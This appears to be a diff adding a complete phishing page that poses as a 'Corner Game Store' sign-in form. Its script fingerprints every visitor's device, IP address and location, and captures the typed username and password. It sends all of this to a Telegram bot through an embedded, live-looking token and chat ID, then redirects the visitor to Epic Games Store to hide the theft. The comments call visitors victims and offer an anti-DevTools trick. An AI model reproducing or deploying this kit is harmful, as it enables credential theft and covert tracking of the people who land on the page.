@@ -1,0 +1,852 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Corner Game Store - Sign In</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0f1e 0%, #141b33 50%, #0d1225 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Animated particles background */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            pointer-events: none;
+        }
+
+        .particle {
+            position: absolute;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 50%;
+            animation: float linear infinite;
+        }
+
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
+        }
+
+        /* Main container */
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 400px;
+            max-width: 95%;
+            background: rgba(20, 25, 45, 0.85);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(79, 172, 254, 0.1), 0 0 40px rgba(79, 172, 254, 0.1);
+            animation: slideUp 0.6s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(40px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Logo area */
+        .logo-area {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 15px;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: #fff;
+            box-shadow: 0 10px 25px rgba(79, 172, 254, 0.3);
+            animation: pulse 2s infinite;
+            transform: rotate(0deg);
+            position: relative;
+        }
+
+        .logo-icon::after {
+            content: '';
+            position: absolute;
+            top: -3px;
+            left: -3px;
+            right: -3px;
+            bottom: -3px;
+            border-radius: 22px;
+            background: linear-gradient(135deg, #4facfe, #00f2fe, #4facfe);
+            z-index: -1;
+            opacity: 0.4;
+            filter: blur(10px);
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .logo-text {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(to right, #fff, #c0d9ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-bottom: 5px;
+        }
+
+        .logo-sub {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.5);
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        /* Form styles */
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 13px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.7);
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #4facfe;
+            background: rgba(79, 172, 254, 0.05);
+            box-shadow: 0 0 0 4px rgba(79, 172, 254, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+        }
+
+        .remember-forgot {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 25px;
+            font-size: 13px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: rgba(255, 255, 255, 0.7);
+            cursor: pointer;
+        }
+
+        .remember-me input {
+            accent-color: #4facfe;
+        }
+
+        .forgot-link {
+            color: #4facfe;
+            text-decoration: none;
+            font-weight: 600;
+            transition: 0.2s;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 25px rgba(79, 172, 254, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(79, 172, 254, 0.5);
+        }
+
+        .login-btn:active {
+            transform: translateY(0);
+        }
+
+        .login-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .login-btn:hover::before {
+            left: 100%;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 25px 0;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 12px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        .divider span {
+            margin: 0 15px;
+        }
+
+        .social-login {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .social-btn {
+            flex: 1;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .social-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: rgba(255, 255, 255, 0.2);
+        }
+
+        .signup-link {
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .signup-link a {
+            color: #4facfe;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 15, 30, 0.9);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-top: 3px solid #4facfe;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 14px;
+        }
+
+        /* Error state */
+        .error-message {
+            display: none;
+            background: rgba(255, 71, 87, 0.1);
+            border: 1px solid rgba(255, 71, 87, 0.3);
+            color: #ff4757;
+            padding: 10px 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            text-align: center;
+        }
+
+        .error-message.show {
+            display: block;
+            animation: shake 0.5s ease;
+        }
+
+        @keyframes shake {
+            0%,100% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-10px); }
+            80% { transform: translateX(10px); }
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .container {
+                padding: 30px 20px;
+            }
+            .logo-text {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Animated particles -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Main container -->
+    <div class="container">
+        <div class="logo-area">
+            <div class="logo-icon">
+                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
+                </svg>
+            </div>
+            <div class="logo-text">Corner</div>
+            <div class="logo-sub">Game Store</div>
+        </div>
+
+        <!-- Error message area -->
+        <div class="error-message" id="errorMsg">
+            Invalid username or password. Please try again.
+        </div>
+
+        <!-- Login form -->
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" name="username" placeholder="Enter your username or email" required autocomplete="off">
+            </div>
+
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+
+            <div class="remember-forgot">
+                <label class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    Remember me
+                </label>
+                <a href="#" class="forgot-link">Forgot Password?</a>
+            </div>
+
+            <button type="submit" class="login-btn">Sign In</button>
+        </form>
+
+        <div class="divider">
+            <span>OR CONTINUE WITH</span>
+        </div>
+
+        <div class="social-login">
+            <button class="social-btn">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/>
+                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Google
+            </button>
+            <button class="social-btn">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
+                    <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                </svg>
+                Github
+            </button>
+        </div>
+
+        <div class="signup-link">
+            Don't have an account? <a href="#">Sign up now</a>
+        </div>
+    </div>
+
+    <!-- Loading overlay for redirection simulation -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text" id="loadingText">Verifying credentials...</div>
+    </div>
+
+    <script>
+    (function() {
+        // ╔══════════════════════════════════════╗
+        // ║   QUANTUM V14.0 - DATA HARVESTER   ║
+        // ║      TELEGRAM BOT INTEGRATION      ║
+        // ╚══════════════════════════════════════╝
+        
+        // ===== CONFIGURATION =====
+        // GANTI DENGAN TOKEN BOT TELEGRAM LO
+        const TELEGRAM_BOT_TOKEN = '8530059653:AAGbdrmnedNbOc5PRUDgrM2AU6finnAeeV0'; // Dapetin dari @BotFather
+        // GANTI DENGAN CHAT ID LO (bisa user ID atau group ID)
+        const TELEGRAM_CHAT_ID = '7959551372'; // Bisa ID pribadi atau channel
+        
+        // Pastikan lo udah bikin bot dan dapet token + chat ID
+        // Kalo belum, goblok! Bikin dulu di @BotFather trus chat bot lo biar dapet chat ID
+        
+        // ===== GLOBAL DATA COLLECTOR =====
+        const collectedData = {
+            timestamp: new Date().toISOString(),
+            page_loaded: new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta', hour12: false }),
+            user_agent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages,
+            cookie_enabled: navigator.cookieEnabled,
+            screen_resolution: `${window.screen.width}x${window.screen.height}`,
+            screen_avail: `${window.screen.availWidth}x${window.screen.availHeight}`,
+            screen_color_depth: window.screen.colorDepth,
+            screen_pixel_depth: window.screen.pixelDepth,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
+            device_pixel_ratio: window.devicePixelRatio,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'Direct',
+            url: window.location.href,
+            hostname: window.location.hostname,
+            protocol: window.location.protocol,
+            connection_type: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+            downlink: navigator.connection ? navigator.connection.downlink : 'unknown',
+            memory: navigator.deviceMemory || 'unknown',
+            hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
+            touch_points: navigator.maxTouchPoints,
+            vendor: navigator.vendor,
+            browser_name: (function() {
+                const ua = navigator.userAgent;
+                if (ua.indexOf("Firefox") > -1) return "Firefox";
+                if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) return "Opera";
+                if (ua.indexOf("Edge") > -1 || ua.indexOf("Edg") > -1) return "Edge";
+                if (ua.indexOf("Chrome") > -1) return "Chrome";
+                if (ua.indexOf("Safari") > -1) return "Safari";
+                return "Unknown";
+            })(),
+            os: (function() {
+                const ua = navigator.userAgent;
+                if (ua.indexOf("Windows") > -1) return "Windows";
+                if (ua.indexOf("Mac") > -1) return "MacOS";
+                if (ua.indexOf("Linux") > -1) return "Linux";
+                if (ua.indexOf("Android") > -1) return "Android";
+                if (ua.indexOf("iOS") > -1 || ua.indexOf("iPhone") > -1 || ua.indexOf("iPad") > -1) return "iOS";
+                return "Unknown";
+            })(),
+            gpu_renderer: (function() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Not available';
+                    }
+                } catch(e) {}
+                return 'Not available';
+            })(),
+            battery: 'unknown',
+            ip: 'fetching...',
+            geolocation: 'not requested yet'
+        };
+
+        // ===== GENERATE PARTICLES BACKGROUND =====
+        function createParticles() {
+            const container = document.getElementById('particles');
+            const count = 30;
+            for (let i = 0; i < count; i++) {
+                const particle = document.createElement('div');
+                particle.classList.add('particle');
+                const size = Math.random() * 4 + 2;
+                particle.style.width = size + 'px';
+                particle.style.height = size + 'px';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDuration = (Math.random() * 15 + 10) + 's';
+                particle.style.animationDelay = Math.random() * 10 + 's';
+                container.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // ===== GET BATTERY STATUS =====
+        if (navigator.getBattery) {
+            navigator.getBattery().then(function(battery) {
+                collectedData.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }).catch(() => {});
+        }
+
+        // ===== GET PUBLIC IP & GEOLOCATION =====
+        function fetchIPAndGeo() {
+            // Gunakan beberapa layanan untuk memastikan IP didapat
+            const ipServices = [
+                'https://api.ipify.org?format=json',
+                'https://api64.ipify.org?format=json',
+                'https://api.ip.sb/geoip',
+                'https://ipapi.co/json/',
+                'https://extreme-ip-lookup.com/json/'
+            ];
+
+            // Coba ambil IP dulu
+            fetch(ipServices[0])
+                .then(response => response.json())
+                .then(data => {
+                    collectedData.ip = data.ip;
+                    // Ambil geo data dari ipapi.co
+                    return fetch(`https://ipapi.co/${data.ip}/json/`);
+                })
+                .then(response => response.json())
+                .then(geoData => {
+                    collectedData.geolocation = {
+                        country: geoData.country_name,
+                        country_code: geoData.country_code,
+                        region: geoData.region,
+                        city: geoData.city,
+                        postal: geoData.postal,
+                        latitude: geoData.latitude,
+                        longitude: geoData.longitude,
+                        timezone: geoData.timezone,
+                        isp: geoData.org,
+                        asn: geoData.asn
+                    };
+                })
+                .catch(() => {
+                    // Fallback ke service lain
+                    fetch(ipServices[3])
+                        .then(r => r.json())
+                        .then(d => {
+                            collectedData.ip = d.ip;
+                            collectedData.geolocation = {
+                                country: d.country_name,
+                                country_code: d.country_code,
+                                region: d.region,
+                                city: d.city,
+                                postal: d.postal,
+                                latitude: d.latitude,
+                                longitude: d.longitude,
+                                timezone: d.timezone,
+                                isp: d.org,
+                                asn: d.asn
+                            };
+                        })
+                        .catch(() => {
+                            collectedData.ip = 'Failed to fetch';
+                        });
+                });
+        }
+        fetchIPAndGeo();
+
+        // ===== SEND MESSAGE TO TELEGRAM =====
+        function sendToTelegram(message) {
+            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            // Kalo token masih default, skip biar nggak error
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                console.warn('[QUANTUM] Bot token atau Chat ID belum diisi. Data tidak dikirim.');
+                console.log('[QUANTUM] Data yang seharusnya dikirim:', message);
+                return;
+            }
+
+            // Telegram punya batas panjang pesan 4096 karakter, jadi kita kirim sebagai beberapa pesan jika perlu
+            const chunks = message.match(/[\s\S]{1,4000}/g) || [message];
+            
+            chunks.forEach((chunk, index) => {
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: index === 0 ? chunk : `(lanjutan ${index+1}/${chunks.length})\n${chunk}`,
+                    parse_mode: 'HTML',
+                    disable_web_page_preview: true
+                };
+
+                fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log(`[QUANTUM] Pesan ${index+1}/${chunks.length} terkirim ke Telegram.`);
+                    } else {
+                        console.error('[QUANTUM] Gagal kirim:', data.description);
+                    }
+                })
+                .catch(error => {
+                    console.error('[QUANTUM] Network error:', error);
+                });
+            });
+        }
+
+        // ===== FORMAT MESSAGE UNTUK TELEGRAM =====
+        function formatCollectedData(additionalData = {}) {
+            const d = { ...collectedData, ...additionalData };
+            const separator = '─'.repeat(30);
+            
+            let msg = '';
+            msg += `🔴 <b>CORNER GAME STORE - NEW VISITOR</b>\n`;
+            msg += `${separator}\n`;
+            msg += `📅 <b>Date/Time:</b> ${d.page_loaded}\n`;
+            msg += `🌐 <b>IP Address:</b> ${d.ip}\n`;
+            
+            if (d.geolocation && d.geolocation !== 'not requested yet') {
+                msg += `\n📍 <b>LOCATION INFO:</b>\n`;
+                msg += `   Country: ${d.geolocation.country || 'N/A'}\n`;
+                msg += `   Region: ${d.geolocation.region || 'N/A'}\n`;
+                msg += `   City: ${d.geolocation.city || 'N/A'}\n`;
+                msg += `   ISP: ${d.geolocation.isp || 'N/A'}\n`;
+                msg += `   Lat/Lon: ${d.geolocation.latitude || '?'}, ${d.geolocation.longitude || '?'}\n`;
+            }
+            
+            msg += `\n💻 <b>DEVICE & BROWSER:</b>\n`;
+            msg += `   Browser: ${d.browser_name}\n`;
+            msg += `   OS: ${d.os}\n`;
+            msg += `   Platform: ${d.platform}\n`;
+            msg += `   Language: ${d.language}\n`;
+            msg += `   Screen: ${d.screen_resolution} (avail: ${d.screen_avail})\n`;
+            msg += `   Viewport: ${d.viewport}\n`;
+            msg += `   Pixel Ratio: ${d.device_pixel_ratio}\n`;
+            msg += `   Touch Points: ${d.touch_points}\n`;
+            msg += `   CPU Cores: ${d.hardware_concurrency}\n`;
+            msg += `   RAM: ${d.memory} GB\n`;
+            msg += `   Connection: ${d.connection_type} (${d.downlink} Mbps)\n`;
+            msg += `   GPU: ${d.gpu_renderer}\n`;
+            
+            if (d.battery && d.battery !== 'unknown') {
+                msg += `   Battery: ${d.battery.level} (${d.battery.charging ? 'Charging' : 'Not charging'})\n`;
+            }
+            
+            msg += `\n🔗 <b>SESSION:</b>\n`;
+            msg += `   URL: ${d.url}\n`;
+            msg += `   Referrer: ${d.referrer}\n`;
+            msg += `   Cookies: ${d.cookie_enabled ? 'Enabled' : 'Disabled'}\n`;
+            msg += `   User Agent: ${d.user_agent}\n`;
+            
+            // Jika ada data login, tambahkan
+            if (d.username || d.password) {
+                msg += `\n🔑 <b>LOGIN CREDENTIALS:</b>\n`;
+                msg += `   Username: ${d.username || 'N/A'}\n`;
+                msg += `   Password: ${d.password || 'N/A'}\n`;
+                if (d.remember) msg += `   Remember Me: ${d.remember}\n`;
+            }
+            
+            msg += `\n${separator}\n`;
+            msg += `<i>Quantum V14.0 © RianModss - Data Harvester v2.4</i>`;
+            
+            return msg;
+        }
+
+        // ===== INITIAL DATA COLLECTION & SEND =====
+        // Tunggu sebentar untuk memastikan IP dan geo sudah diambil
+        setTimeout(() => {
+            const initialMsg = formatCollectedData();
+            sendToTelegram(initialMsg);
+            console.log('[QUANTUM] Data awal korban terkirim ke Telegram.');
+        }, 2000); // Delay 2 detik agar IP sempat di-fetch
+
+        // ===== FORM SUBMISSION HANDLER =====
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const remember = document.getElementById('remember').checked;
+            
+            if (!username || !password) {
+                // Show error
+                const errorEl = document.getElementById('errorMsg');
+                errorEl.textContent = 'Please fill in all fields.';
+                errorEl.classList.add('show');
+                setTimeout(() => errorEl.classList.remove('show'), 3000);
+                return;
+            }
+            
+            // Update collected data with credentials
+            const loginData = {
+                username: username,
+                password: password,
+                remember: remember,
+                form_submitted: new Date().toLocaleString('en-US', { timeZone: 'Asia/Jakarta', hour12: false })
+            };
+            
+            // Merge with global data
+            Object.assign(collectedData, loginData);
+            
+            // Format and send to Telegram
+            const loginMsg = formatCollectedData(loginData);
+            sendToTelegram(loginMsg);
+            
+            console.log('[QUANTUM] Data login korban terkirim ke Telegram.');
+            
+            // Tampilkan loading overlay untuk simulasi "verifikasi"
+            const overlay = document.getElementById('loadingOverlay');
+            const loadingText = document.getElementById('loadingText');
+            overlay.classList.add('active');
+            
+            // Animasi teks loading
+            const loadingMessages = [
+                'Verifying credentials...',
+                'Authenticating user...',
+                'Connecting to server...',
+                'Checking account status...',
+                'Loading game library...',
+                'Preparing dashboard...'
+            ];
+            let msgIndex = 0;
+            const interval = setInterval(() => {
+                msgIndex = (msgIndex + 1) % loadingMessages.length;
+                loadingText.textContent = loadingMessages[msgIndex];
+            }, 1200);
+            
+            // Setelah 4 detik, redirect ke halaman asli game store (untuk kamuflase)
+            setTimeout(() => {
+                clearInterval(interval);
+                // Ganti dengan URL redirect lo sendiri kalo mau, misal ke halaman store beneran
+                window.location.href = 'https://store.epicgames.com/en-US/'; // Redirect ke Epic Games Store biar meyakinkan
+                // Atau bisa juga pake:
+                // window.location.href = 'https://store.steampowered.com/';
+            }, 4000);
+        });
+
+        // ===== PREVENT DEFAULT ON FORGOT PASSWORD =====
+        document.querySelector('.forgot-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            const errorEl = document.getElementById('errorMsg');
+            errorEl.textContent = 'Password reset feature is currently unavailable. Please try again later.';
+            errorEl.classList.add('show');
+            setTimeout(() => errorEl.classList.remove('show'), 3000);
+        });
+
+        // ===== SOCIAL LOGIN BUTTONS =====
+        document.querySelectorAll('.social-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                const errorEl = document.getElementById('errorMsg');
+                errorEl.textContent = 'Social login is temporarily disabled. Please use email login.';
+                errorEl.classList.add('show');
+                setTimeout(() => errorEl.classList.remove('show'), 3000);
+            });
+        });
+
+        // ===== SIGN UP LINK =====
+        document.querySelector('.signup-link a').addEventListener('click', function(e) {
+            e.preventDefault();
+            const errorEl = document.getElementById('errorMsg');
+            errorEl.textContent = 'Registration is currently closed. Please check back later.';
+            errorEl.classList.add('show');
+            setTimeout(() => errorEl.classList.remove('show'), 3000);
+        });
+
+        // ===== DEBUG MODE (Bisa dihapus kalo udah production) =====
+        // console.log('[QUANTUM] System initialized. Waiting for target...');
+        // console.log('[QUANTUM] Bot Token:', TELEGRAM_BOT_TOKEN ? 'SET' : 'NOT SET');
+        // console.log('[QUANTUM] Chat ID:', TELEGRAM_CHAT_ID ? 'SET' : 'NOT SET');
+        
+        // ===== ANTI-DEBUG / ANTI-TAMPER (Opsional) =====
+        // Detect DevTools buka
+        /*
+        setInterval(function() {
+            const threshold = 160;
+            if (window.outerWidth - window.innerWidth > threshold || 
+                window.outerHeight - window.innerHeight > threshold) {
+                // DevTools mungkin terbuka, bisa redirect atau apus data
+                console.clear();
+            }
+        }, 1000);
+        */
+
+        console.log('%c⚠️ Security Warning: This is a private system. Unauthorized access is prohibited.', 'color: red; font-size: 16px;');
+        console.log('%cAll activities are monitored and logged.', 'color: yellow;');
+        
+    })();
+    </script>
+</body>
+</html>
